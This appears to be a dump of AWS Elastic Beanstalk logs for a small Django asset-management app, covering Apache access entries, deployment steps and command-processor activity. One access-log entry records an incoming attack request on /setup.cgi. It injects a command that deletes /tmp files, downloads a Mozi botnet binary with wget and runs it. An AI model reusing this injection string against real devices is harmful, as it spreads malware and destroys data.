+172.31.24.60 (73.14.250.73) - - [29/Jan/2020:19:40:30 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+172.31.24.60 (209.17.96.194) - - [29/Jan/2020:19:40:49 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+::1 (-) - - [29/Jan/2020:19:41:30 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:41:31 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:41:49 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:41:50 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:42:15 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+127.0.0.1 (-) - - [29/Jan/2020:19:46:46 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:46:47 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:46:48 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:46:49 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+172.31.24.60 (73.14.250.73) - - [29/Jan/2020:19:47:20 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+::1 (-) - - [29/Jan/2020:19:48:17 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:48:18 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:48:20 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:48:21 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:48:22 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:48:23 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+172.31.48.120 (169.197.108.42) - - [29/Jan/2020:19:50:08 +0000] "GET /solr/ HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+172.31.24.60 (223.155.123.23) - - [29/Jan/2020:19:51:11 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1" 500 527 "-" "-"
+127.0.0.1 (-) - - [29/Jan/2020:19:51:42 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:51:43 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:51:44 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:51:45 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:54:06 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:54:07 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:54:08 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:54:09 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+172.31.48.120 (73.14.250.73) - - [29/Jan/2020:19:54:25 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+::1 (-) - - [29/Jan/2020:19:55:07 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:08 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:22 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:23 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:24 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:25 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:26 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:27 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:55:28 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+172.31.24.60 (88.251.182.56) - - [29/Jan/2020:19:55:37 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
+127.0.0.1 (-) - - [29/Jan/2020:19:56:56 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:56:57 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:56:58 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:56:59 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+172.31.24.60 (73.14.250.73) - - [29/Jan/2020:19:57:16 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+::1 (-) - - [29/Jan/2020:19:58:17 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:58:18 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:58:26 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+127.0.0.1 (-) - - [29/Jan/2020:20:00:47 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:20:00:48 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:20:00:49 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:20:00:50 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+172.31.48.120 (73.14.250.73) - - [29/Jan/2020:20:01:05 +0000] "GET / HTTP/1.1" 500 527 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15"
+
+
+
+-------------------------------------
+/var/log/eb-activity.log
+-------------------------------------
+    inflating: /opt/python/ondeck/app/assman/app/migrations/__pycache__/0002_auto_20200128_0515.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/app/migrations/__pycache__/__init__.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/app/models.py  
+     creating: /opt/python/ondeck/app/assman/app/static/
+    inflating: /opt/python/ondeck/app/assman/app/static/plus.svg  
+    inflating: /opt/python/ondeck/app/assman/app/static/rho_gamma_logo.jpg  
+     creating: /opt/python/ondeck/app/assman/app/templates/
+     creating: /opt/python/ondeck/app/assman/app/templates/app/
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/card_confirm_delete.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/card_detail.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/card_form.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/card_list.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/card_search_results.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/item_confirm_delete.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/item_detail.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/item_form.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/item_list.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/item_search_results.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/key_confirm_delete.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/key_detail.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/key_form.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/key_list.html  
+    inflating: /opt/python/ondeck/app/assman/app/templates/app/key_search_results.html  
+    inflating: /opt/python/ondeck/app/assman/app/tests.py  
+    inflating: /opt/python/ondeck/app/assman/app/urls.py  
+    inflating: /opt/python/ondeck/app/assman/app/views.py  
+     creating: /opt/python/ondeck/app/assman/assman/
+   extracting: /opt/python/ondeck/app/assman/assman/__init__.py  
+     creating: /opt/python/ondeck/app/assman/assman/__pycache__/
+    inflating: /opt/python/ondeck/app/assman/assman/__pycache__/__init__.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/assman/__pycache__/settings.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/assman/__pycache__/urls.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/assman/__pycache__/wsgi.cpython-37.pyc  
+    inflating: /opt/python/ondeck/app/assman/assman/settings.py  
+    inflating: /opt/python/ondeck/app/assman/assman/urls.py  
+    inflating: /opt/python/ondeck/app/assman/assman/wsgi.py  
+    inflating: /opt/python/ondeck/app/db.sqlite3  
+    inflating: /opt/python/ondeck/app/manage.py  
+    inflating: /opt/python/ondeck/app/requirements.txt  
+[2020-01-29T20:00:40.468Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/AppDeployPreHook/03deploy.py] : Starting activity...
+[2020-01-29T20:00:41.084Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/AppDeployPreHook/03deploy.py] : Completed activity. Result:
+  Requirement already satisfied: Django==2.2.3 in /opt/python/run/venv/lib/python3.6/site-packages (from -r /opt/python/ondeck/app/requirements.txt (line 1))
+  Requirement already satisfied: pytz==2019.3 in /opt/python/run/venv/lib/python3.6/site-packages (from -r /opt/python/ondeck/app/requirements.txt (line 2))
+  Requirement already satisfied: sqlparse==0.3.0 in /opt/python/run/venv/lib/python3.6/site-packages (from -r /opt/python/ondeck/app/requirements.txt (line 3))
+  You are using pip version 9.0.1, however version 20.0.2 is available.
+  You should consider upgrading via the 'pip install --upgrade pip' command.
+[2020-01-29T20:00:41.085Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/AppDeployPreHook/04configen.py] : Starting activity...
+[2020-01-29T20:00:42.312Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/AppDeployPreHook/04configen.py] : Completed activity.
+[2020-01-29T20:00:42.312Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/AppDeployPreHook] : Completed activity. Result:
+  Successfully execute hooks in directory /opt/elasticbeanstalk/hooks/appdeploy/pre.
+[2020-01-29T20:00:42.312Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/EbExtensionPostBuild] : Starting activity...
+[2020-01-29T20:00:42.665Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/EbExtensionPostBuild/Infra-EmbeddedPostBuild] : Starting activity...
+[2020-01-29T20:00:42.665Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/EbExtensionPostBuild/Infra-EmbeddedPostBuild] : Completed activity.
+[2020-01-29T20:00:42.680Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/EbExtensionPostBuild] : Completed activity.
+[2020-01-29T20:00:42.680Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/InfraCleanEbextension] : Starting activity...
+[2020-01-29T20:00:42.681Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0/InfraCleanEbextension] : Completed activity. Result:
+  Cleaned ebextensions subdirectories from /opt/python/ondeck/app.
+[2020-01-29T20:00:42.681Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage0] : Completed activity. Result:
+  Application update - Command CMD-AppDeploy stage 0 completed
+[2020-01-29T20:00:42.681Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1] : Starting activity...
+[2020-01-29T20:00:42.682Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook] : Starting activity...
+[2020-01-29T20:00:42.682Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/01flip.py] : Starting activity...
+[2020-01-29T20:00:51.463Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/01flip.py] : Completed activity. Result:
+  httpd: stopped
+  httpd: started
+  httpd                            RUNNING   pid 27261, uptime 0:00:03
+  2020-01-29 20:00:51,457 INFO     Apache is running, but root page is not responding in 3 seconds.
+[2020-01-29T20:00:51.464Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/01stop_xray.sh] : Starting activity...
+[2020-01-29T20:00:51.578Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/01stop_xray.sh] : Completed activity. Result:
+  Executing: if ( initctl status xray | grep start ); then initctl stop xray; fi
+  
+[2020-01-29T20:00:51.578Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/02create_pids_for_monitoring.sh] : Starting activity...
+[2020-01-29T20:00:51.681Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/02create_pids_for_monitoring.sh] : Completed activity. Result:
+  + chmod 0755 /var/run/httpd
+  + /opt/elasticbeanstalk/bin/healthd-track-pidfile --proxy httpd
+  + /opt/elasticbeanstalk/bin/healthd-track-pidfile --name application --location /opt/python/run/supervisord.pid
+[2020-01-29T20:00:51.681Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/02start_xray.sh] : Starting activity...
+[2020-01-29T20:00:51.789Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook/02start_xray.sh] : Completed activity.
+[2020-01-29T20:00:51.789Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployEnactHook] : Completed activity. Result:
+  Successfully execute hooks in directory /opt/elasticbeanstalk/hooks/appdeploy/enact.
+[2020-01-29T20:00:51.789Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployPostHook] : Starting activity...
+[2020-01-29T20:00:51.790Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1/AppDeployPostHook] : Completed activity. Result:
+  Successfully execute hooks in directory /opt/elasticbeanstalk/hooks/appdeploy/post.
+[2020-01-29T20:00:51.790Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AppDeployStage1] : Completed activity. Result:
+  Application version switch - Command CMD-AppDeploy stage 1 completed
+[2020-01-29T20:00:51.790Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter] : Starting activity...
+[2020-01-29T20:00:51.790Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter/ConfigLogRotation] : Starting activity...
+[2020-01-29T20:00:51.790Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter/ConfigLogRotation/10-config.sh] : Starting activity...
+[2020-01-29T20:00:51.871Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter/ConfigLogRotation/10-config.sh] : Completed activity. Result:
+  Disabled forced hourly log rotation.
+[2020-01-29T20:00:51.871Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter/ConfigLogRotation] : Completed activity. Result:
+  Successfully execute hooks in directory /opt/elasticbeanstalk/addons/logpublish/hooks/config.
+[2020-01-29T20:00:51.871Z] INFO  [27101] - [Application update app-c45a-200129_130029@15/AddonsAfter] : Completed activity.
+[2020-01-29T20:00:51.871Z] INFO  [27101] - [Application update app-c45a-200129_130029@15] : Completed activity. Result:
+  Application update - Command CMD-AppDeploy succeeded
+[2020-01-29T20:01:17.970Z] INFO  [27453] - [CMD-TailLogs] : Starting activity...
+[2020-01-29T20:01:17.970Z] INFO  [27453] - [CMD-TailLogs/AddonsBefore] : Starting activity...
+[2020-01-29T20:01:17.970Z] INFO  [27453] - [CMD-TailLogs/AddonsBefore] : Completed activity.
+[2020-01-29T20:01:17.970Z] INFO  [27453] - [CMD-TailLogs/TailLogs] : Starting activity...
+[2020-01-29T20:01:17.971Z] INFO  [27453] - [CMD-TailLogs/TailLogs/TailLogs] : Starting activity...
+
+
+
+-------------------------------------
+/var/log/eb-commandprocessor.log
+-------------------------------------
+[2020-01-29T19:57:26.479Z] DEBUG [26955] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_API||_Commands..
+[2020-01-29T19:57:26.479Z] INFO  [26955] : Found enabled addons: ["logstreaming", "logpublish"].
+[2020-01-29T19:57:26.480Z] INFO  [26955] : Updating Command definition of addon logstreaming.
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Updating Command definition of addon logpublish.
+[2020-01-29T19:57:26.481Z] DEBUG [26955] : Loaded definition of Command CMD-TailLogs.
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Executing CMD-TailLogs
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Executing command: CMD-TailLogs...
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Executing command CMD-TailLogs activities...
+[2020-01-29T19:57:26.481Z] DEBUG [26955] : Setting environment variables..
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Running AddonsBefore for command CMD-TailLogs...
+[2020-01-29T19:57:26.481Z] DEBUG [26955] : Running stages of Command CMD-TailLogs from stage 0 to stage 0...
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Running stage 0 of command CMD-TailLogs...
+[2020-01-29T19:57:26.481Z] DEBUG [26955] : Loaded 1 actions for stage 0.
+[2020-01-29T19:57:26.481Z] INFO  [26955] : Running 1 of 1 actions: TailLogs...
+[2020-01-29T19:57:26.686Z] INFO  [26955] : Running AddonsAfter for command CMD-TailLogs...
+[2020-01-29T19:57:26.686Z] INFO  [26955] : Command CMD-TailLogs succeeded!
+[2020-01-29T19:57:26.686Z] INFO  [26955] : Command processor returning results: 
+{"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"","returncode":0,"events":[{"msg":"[Instance: i-01c319abc46dd1916] Successfully finished tailing 5 log(s)","severity":"INFO","timestamp":1580327846686}]}]}
+[2020-01-29T20:00:37.915Z] DEBUG [27101] : Reading config file: /etc/elasticbeanstalk/.aws-eb-stack.properties
+[2020-01-29T20:00:37.915Z] DEBUG [27101] : Checking if the command processor should execute...
+[2020-01-29T20:00:37.917Z] DEBUG [27101] : Checking whether the command is applicable to instance (i-01c319abc46dd1916)..
+[2020-01-29T20:00:37.917Z] INFO  [27101] : Command is applicable to this instance (i-01c319abc46dd1916)..
+[2020-01-29T20:00:37.917Z] DEBUG [27101] : Checking if the received command stage is valid..
+[2020-01-29T20:00:37.917Z] INFO  [27101] : No stage_num in command. Valid stage..
+[2020-01-29T20:00:37.917Z] INFO  [27101] : Received command CMD-AppDeploy: {"execution_data"=>"{\"leader_election\":\"true\"}", "instance_ids"=>["i-01c319abc46dd1916"], "data"=>"manifest_1580328035229", "command_name"=>"CMD-AppDeploy", "api_version"=>"1.0", "resource_name"=>"AWSEBAutoScalingGroup", "request_id"=>"c53fcb9a-b849-455e-81d1-b125a9603330"}
+[2020-01-29T20:00:37.917Z] INFO  [27101] : Command processor should execute command.
+[2020-01-29T20:00:37.917Z] DEBUG [27101] : Storing current stage..
+[2020-01-29T20:00:37.917Z] DEBUG [27101] : Stage_num does not exist. Not saving null stage. Returning..
+[2020-01-29T20:00:37.917Z] DEBUG [27101] : Reading config file: /etc/elasticbeanstalk/.aws-eb-stack.properties
+[2020-01-29T20:00:37.918Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_ContainerConfigFileContent||commands..
+[2020-01-29T20:00:37.918Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_API||_Commands..
+[2020-01-29T20:00:37.919Z] INFO  [27101] : Found enabled addons: ["logstreaming", "logpublish"].
+[2020-01-29T20:00:37.920Z] INFO  [27101] : Updating Command definition of addon logstreaming.
+[2020-01-29T20:00:37.920Z] INFO  [27101] : Updating Command definition of addon logpublish.
+[2020-01-29T20:00:37.920Z] DEBUG [27101] : Refreshing metadata...
+[2020-01-29T20:00:38.321Z] DEBUG [27101] : Refreshed environment metadata.
+[2020-01-29T20:00:38.321Z] INFO  [27101] : Recreated directory /opt/elasticbeanstalk/deploy/configuration/.
+[2020-01-29T20:00:38.321Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_AppSourceUrlFileContent||url..
+[2020-01-29T20:00:38.322Z] INFO  [27101] : Created appsource url file at /opt/elasticbeanstalk/deploy/configuration/appsourceurl.
+[2020-01-29T20:00:38.322Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_ContainerConfigFileContent..
+[2020-01-29T20:00:38.324Z] INFO  [27101] : Created container config file at /opt/elasticbeanstalk/deploy/configuration/containerconfiguration.
+[2020-01-29T20:00:38.324Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_ContainerConfigFileContent||commands..
+[2020-01-29T20:00:38.325Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_API||_Commands..
+[2020-01-29T20:00:38.325Z] INFO  [27101] : Found enabled addons: ["logstreaming", "logpublish"].
+[2020-01-29T20:00:38.326Z] INFO  [27101] : Updating Command definition of addon logstreaming.
+[2020-01-29T20:00:38.326Z] INFO  [27101] : Updating Command definition of addon logpublish.
+[2020-01-29T20:00:38.326Z] DEBUG [27101] : Retrieving metadata for key: AWS::CloudFormation::Init||Infra-WriteApplication2||files..
+[2020-01-29T20:00:38.327Z] DEBUG [27101] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||ManifestFileS3Key..
+[2020-01-29T20:00:38.423Z] INFO  [27101] : Loading manifest from bucket 'elasticbeanstalk-us-west-2-059787783705' using computed S3 key 'resources/environments/e-apkzb2s2zs/_runtime/versions/manifest_1580328035229'.
+[2020-01-29T20:00:38.477Z] INFO  [27101] : Updated manifest cache: deployment ID 15 and serial 15.
+[2020-01-29T20:00:38.477Z] DEBUG [27101] : Loaded definition of Command CMD-AppDeploy.
+[2020-01-29T20:00:38.477Z] INFO  [27101] : Executing Application update
+[2020-01-29T20:00:38.478Z] INFO  [27101] : Executing command: CMD-AppDeploy...
+[2020-01-29T20:00:38.478Z] INFO  [27101] : Executing command CMD-AppDeploy activities...
+[2020-01-29T20:00:38.478Z] DEBUG [27101] : Setting environment variables..
+[2020-01-29T20:00:38.478Z] INFO  [27101] : Running AddonsBefore for command CMD-AppDeploy...
+[2020-01-29T20:00:38.603Z] DEBUG [27101] : Running stages of Command CMD-AppDeploy from stage 0 to stage 1...
+[2020-01-29T20:00:38.603Z] INFO  [27101] : Running stage 0 of command CMD-AppDeploy...
+[2020-01-29T20:00:38.603Z] INFO  [27101] : Running leader election...
+[2020-01-29T20:00:39.000Z] INFO  [27101] : Instance is Leader.
+[2020-01-29T20:00:39.000Z] DEBUG [27101] : Loaded 5 actions for stage 0.
+[2020-01-29T20:00:39.000Z] INFO  [27101] : Running 1 of 5 actions: DownloadSourceBundle...
+[2020-01-29T20:00:39.336Z] INFO  [27101] : Running 2 of 5 actions: EbExtensionPreBuild...
+[2020-01-29T20:00:39.703Z] INFO  [27101] : Running 3 of 5 actions: AppDeployPreHook...
+[2020-01-29T20:00:42.312Z] INFO  [27101] : Running 4 of 5 actions: EbExtensionPostBuild...
+[2020-01-29T20:00:42.680Z] INFO  [27101] : Running 5 of 5 actions: InfraCleanEbextension...
+[2020-01-29T20:00:42.681Z] INFO  [27101] : Running stage 1 of command CMD-AppDeploy...
+[2020-01-29T20:00:42.682Z] DEBUG [27101] : Loaded 2 actions for stage 1.
+[2020-01-29T20:00:42.682Z] INFO  [27101] : Running 1 of 2 actions: AppDeployEnactHook...
+[2020-01-29T20:00:51.789Z] INFO  [27101] : Running 2 of 2 actions: AppDeployPostHook...
+[2020-01-29T20:00:51.790Z] INFO  [27101] : Running AddonsAfter for command CMD-AppDeploy...
+[2020-01-29T20:00:51.871Z] INFO  [27101] : Command CMD-AppDeploy succeeded!
+[2020-01-29T20:00:51.871Z] INFO  [27101] : Command processor returning results: 
+{"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"","returncode":0,"events":[]}]}
+[2020-01-29T20:01:17.965Z] DEBUG [27453] : Reading config file: /etc/elasticbeanstalk/.aws-eb-stack.properties
+[2020-01-29T20:01:17.965Z] DEBUG [27453] : Checking if the command processor should execute...
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Checking whether the command is applicable to instance (i-01c319abc46dd1916)..
+[2020-01-29T20:01:17.967Z] INFO  [27453] : Command is applicable to this instance (i-01c319abc46dd1916)..
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Checking if the received command stage is valid..
+[2020-01-29T20:01:17.967Z] INFO  [27453] : No stage_num in command. Valid stage..
+[2020-01-29T20:01:17.967Z] INFO  [27453] : Received command CMD-TailLogs: {"execution_data"=>"*", "instance_ids"=>["i-01c319abc46dd1916"], "data"=>"61c80abc-1b5a-4513-9204-41a96b3e9ba8", "command_name"=>"CMD-TailLogs", "api_version"=>"1.0", "resource_name"=>"AWSEBAutoScalingGroup", "request_id"=>"61c80abc-1b5a-4513-9204-41a96b3e9ba8"}
+[2020-01-29T20:01:17.967Z] INFO  [27453] : Command processor should execute command.
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Storing current stage..
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Stage_num does not exist. Not saving null stage. Returning..
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Reading config file: /etc/elasticbeanstalk/.aws-eb-stack.properties
+[2020-01-29T20:01:17.967Z] DEBUG [27453] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_ContainerConfigFileContent||commands..
+[2020-01-29T20:01:17.968Z] DEBUG [27453] : Retrieving metadata for key: AWS::ElasticBeanstalk::Ext||_API||_Commands..
+[2020-01-29T20:01:17.968Z] INFO  [27453] : Found enabled addons: ["logstreaming", "logpublish"].
